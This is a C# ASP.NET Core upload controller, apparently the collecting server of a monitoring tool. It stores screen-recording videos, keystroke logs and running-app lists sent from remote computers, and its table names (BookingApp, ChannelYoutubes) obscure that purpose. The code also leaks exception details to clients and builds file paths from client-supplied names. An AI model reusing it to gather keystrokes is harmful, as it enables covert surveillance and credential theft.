using BookingApp.DB.Classes.DB;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Routing.Constraints;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Dynamic.Core;
using System.Threading.Tasks;

// For more information on enabling Web API for empty projects, visit https://go.microsoft.com/fwlink/?LinkID=397860

namespace BookingApp.Controllers
{
    [Route("api/[controller]/[action]")]
    [ApiController]
    public class UploadController : ControllerBase
    {
        private readonly IHostEnvironment _env;
        private readonly ILogger<UploadController> _logger;
        public UploadController(IHostEnvironment env, ILogger<UploadController> logger)
        {
            _env = env;
            _logger = logger;
        }
        public class VideoDto
        {
            public IFormFile Video { set; get; }
            public string ip { set; get; }
            public string keylog { set; get; }
            public string apps { set; get; }
        }
        [HttpGet]
        public Videos Get(int id)
        {
            var db = new AppDbContext();

            var book = db.Videos.Where(x => x.Id == id).FirstOrDefault();
            book.VideoPath = @"/" + book.VideoPath.Replace(@"\", @"/");

            return book;
        }
        [HttpPost]
        public async Task<IActionResult> UploadVideos([FromForm] VideoDto video)
        {
            try
            {
                using var db = new AppDbContext();
                var computers = db.ChannelYoutubes.ToList();
                var com = computers.Where(x => x.Link.Contains(video.ip)).FirstOrDefault();
                // Split the Video path using the backslash ('\') character as the separator
                string[] VideoPathParts = video.Video.FileName.Split('\\');
                // Extract the Videoname without the extension (assuming the last part is the Videoname)
                string VideoNameWithoutExtension = VideoPathParts[VideoPathParts.Length - 1];

                string name = VideoNameWithoutExtension.Split(".")[0];
                string VideoName = name + "_" + com.Id + ".mp4";

                string fPath = Path.Combine(_env.ContentRootPath, "file", VideoName); // Or use your preferred storage location
                using (var stream = new FileStream(fPath, FileMode.Create))
                {
                    await video.Video.CopyToAsync(stream);

                }
                DateTime from = convert(long.Parse(name.Split("_")[0]));
                DateTime to = convert(long.Parse(name.Split("_")[1]));
                
                db.Add(new Videos()
                {
                    VideoPath = Path.Combine("file", VideoName),
                    Keylog = video.keylog,
                    Apps = video.apps,
                    ChannelId = com.Id,
                    CreatedDate = DateTime.Now,
                    Year = from.Year,
                    Month = from.Month,
                    Date = from.Day,
                    Hours = from.Hour,
                    Minutes = from.Minute,
                    Start = from,
                    End = to,
                    IsDelete = 0
                });


                db.SaveChanges();
                _logger.LogInformation("Tạo mới video: " + VideoName);

                return Ok("Videos uploaded successfully");
            }
            catch (Exception ex)
            {
                return Ok(ex.ToString());
            }

        }
        private DateTime convert (long ticks)
        {
            var when = new DateTime(1970, 1, 1).AddSeconds(ticks);

            // Convert the UTC DateTime to the local time zone (Hanoi, Vietnam)
            DateTime localDateTime = when.ToLocalTime();
            return localDateTime;
        }
    }
}
